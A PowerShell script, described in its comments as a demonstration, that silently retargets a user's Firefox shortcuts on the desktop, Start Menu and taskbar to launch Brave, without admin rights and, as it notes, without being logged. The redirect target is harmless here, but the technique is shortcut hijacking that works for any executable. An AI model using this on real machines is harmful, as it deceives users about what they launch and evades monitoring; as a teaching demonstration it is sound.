# This script uses Brave and Firefox respectively to demonstrate how a .lnk file can be modifed to deceptivly
# change what a shortcut on a windows machine launches. This runs at a regular user level, does not need admin. 
# Without extensive powershell logging, this is not recorded as an event

# This is also verbose for debugging / demonstrative purposes. 


# Function to find Firefox shortcuts and modify them to launch Brave
function Convert-FirefoxToBrave {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ShortcutPath,
        
        # Default Brave installation path
        [string]$BravePath = "${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe"
    )
    
    try {
        # Verify the shortcut exists
        if (-not (Test-Path $ShortcutPath)) {
            Write-Error "Firefox shortcut not found: $ShortcutPath"
            return $false
        }
        
        # Verify Brave exists
        if (-not (Test-Path $BravePath)) {
            # Try alternate installation path (x86)
            $BravePath = "${env:ProgramFiles(x86)}\BraveSoftware\Brave-Browser\Application\brave.exe"
            if (-not (Test-Path $BravePath)) {
                Write-Error "Brave browser not found. Please verify it's installed."
                return $false
            }
        }
        
        # Create a WScript Shell object
        $shell = New-Object -ComObject WScript.Shell
        
        # Get the shortcut
        $shortcut = $shell.CreateShortcut($ShortcutPath)
        
        # Store original values for logging
        $originalTarget = $shortcut.TargetPath
        
        # Modify the shortcut properties
        $shortcut.TargetPath = $BravePath
        $shortcut.WorkingDirectory = (Split-Path $BravePath -Parent)
        $shortcut.IconLocation = "$BravePath,0"
        
        # Save the changes
        $shortcut.Save()
        
        Write-Host "Successfully modified: $ShortcutPath"
        Write-Host "Original Target: $originalTarget"
        Write-Host "New Target: $BravePath"
        
        return $true
    }
    catch {
        Write-Error "Failed to modify shortcut: $_"
        return $false
    }
    finally {
        # Clean up COM objects
        if ($shortcut) {
            [System.Runtime.InteropServices.Marshal]::ReleaseComObject($shortcut) | Out-Null
        }
        if ($shell) {
            [System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell) | Out-Null
        }
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
    }
}

# Only check user-specific locations (no admin required)
$userShortcutLocations = @(
    "$env:USERPROFILE\Desktop\Firefox.lnk",
    "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Firefox.lnk",
    "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Firefox.lnk",
    "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\Firefox.lnk"
)

# Try to modify all user-level Firefox shortcuts
foreach ($shortcutPath in $userShortcutLocations) {
    if (Test-Path $shortcutPath) {
        Write-Host "Found Firefox shortcut at: $shortcutPath"
        Convert-FirefoxToBrave -ShortcutPath $shortcutPath
    }
}

Write-Host "`nCompleted checking all user-level shortcuts."